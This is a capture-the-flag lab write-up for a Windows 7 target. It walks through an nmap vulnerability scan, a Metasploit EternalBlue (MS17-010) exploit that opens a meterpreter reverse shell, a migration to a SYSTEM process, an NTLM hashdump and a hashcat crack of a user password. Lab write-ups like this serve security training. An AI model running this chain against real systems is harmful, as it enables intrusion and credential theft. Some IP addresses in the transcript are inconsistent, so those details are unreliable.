# Blue

IP Address: 10.10.107.23

## Flags

1. flag{access_the_machine}
2. flag{sam_database_elevated_access}
3. flag{admin_documents_can_be_valuable}

## Enumeration/Scanning

### Nmap:
```sh
nmap -sV -vv --script vuln 10.10.107.23
Starting Nmap 7.92 ( https://nmap.org  ) at 2022-09-20 22:23 PDT
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 22:23
NSE Timing: About 87.50% done; ETC: 22:23 (0:00:04 remaining)
Completed NSE at 22:23, 36.17s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 22:23
Completed NSE at 22:23, 0.00s elapsed
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Initiating Ping Scan at 22:23
Scanning 10.10.107.23 [4 ports]
Completed Ping Scan at 22:23, 0.39s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:23
Completed Parallel DNS resolution of 1 host. at 22:23, 0.02s elapsed
Initiating SYN Stealth Scan at 22:23
Scanning 10.10.107.23 [1000 ports]
Discovered open port 445/tcp on 10.10.107.23
Discovered open port 3389/tcp on 10.10.107.23
Discovered open port 135/tcp on 10.10.107.23
Discovered open port 139/tcp on 10.10.107.23
Discovered open port 49152/tcp on 10.10.107.23
Increasing send delay for 10.10.107.23 from 0 to 5 due to 71 out of 236 dropped probes since last increase.
Increasing send delay for 10.10.107.23 from 5 to 10 due to 11 out of 22 dropped probes since last increase.
Discovered open port 49154/tcp on 10.10.107.23
Discovered open port 49158/tcp on 10.10.107.23
Discovered open port 49153/tcp on 10.10.107.23
Discovered open port 49159/tcp on 10.10.107.23
Completed SYN Stealth Scan at 22:23, 14.04s elapsed (1000 total ports)
Initiating Service scan at 22:23
Scanning 9 services on 10.10.107.23
Service scan Timing: About 55.56% done; ETC: 22:25 (0:00:46 remaining)
Completed Service scan at 22:24, 64.04s elapsed (9 services on 1 host)
NSE: Script scanning 10.10.107.23.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 22:24
NSE Timing: About 99.91% done; ETC: 22:25 (0:00:00 remaining)
Completed NSE at 22:25, 32.46s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 22:25
NSE: [ssl-ccs-injection 10.10.107.23:3389] No response from server: ERROR
Completed NSE at 22:25, 6.96s elapsed
Nmap scan report for 10.10.107.23
Host is up, received echo-reply ttl 127 (0.17s latency).
Scanned at 2022-09-20 22:23:40 PDT for 117s
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped   syn-ack ttl 127
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
 [F1: All]  F2: Playback  F3: Recording  F4: Outputs  F5: Inputs  F12: Settings 
 
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49159/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 22:25
Completed NSE at 22:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 22:25
```

## Exploitation

### MSFVenom/Metasploit

Nmap found a Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010). Search mfsvenom, set options, and run.

```sh
> msfvenom
```
```
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
	    -  ----                                      ---------------  ----     -----  -----------
			-    0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
			-    1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
			-    2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
			-    3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
			-    4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
	- Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```
```
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.18.102.73
LHOST => 10.18.102.73
```

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.102.73
rhosts => 10.18.102.73
```

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.18.57.77:4445 
[*] 10.10.102.73:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.102.73:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.102.73:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.102.73:445 - The target is vulnerable.
[*] 10.10.102.73:445 - Connecting to target for exploitation.
[+] 10.10.102.73:445 - Connection established for exploitation.
[+] 10.10.102.73:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.102.73:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.102.73:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.102.73:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.102.73:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.102.73:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.102.73:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.102.73:445 - Sending all but last fragment of exploit packet
[*] 10.10.102.73:445 - Starting non-paged pool grooming
[+] 10.10.102.73:445 - Sending SMBv2 buffers
[+] 10.10.102.73:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.102.73:445 - Sending final SMBv2 buffers.
[*] 10.10.102.73:445 - Sending last fragment of exploit packet!
[*] 10.10.102.73:445 - Receiving response from exploit packet
[+] 10.10.102.73:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.102.73:445 - Sending egg to corrupted connection.
[*] 10.10.102.73:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.10.102.73
[*] Meterpreter session 1 opened (10.18.57.77:4445 -> 10.10.102.73:49170) at 2022-09-21 21:07:24 -0700
[+] 10.10.102.73:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.102.73:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.102.73:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > pwd
C:\Windows\system32
```

## Privilege Escalation

For privilege escalation, find a process with the same architecture and permissions as NT AUTHORITY\SYSTEM, migrate to it, and run hashdump.

```
meterpreter > ps
```

```
meterpreter > migrate 1314
```

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

```
> echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > hash.txt
```

Use hashcat or john to crack the hash.

```sh
> sudo hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
...
ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22
...
```
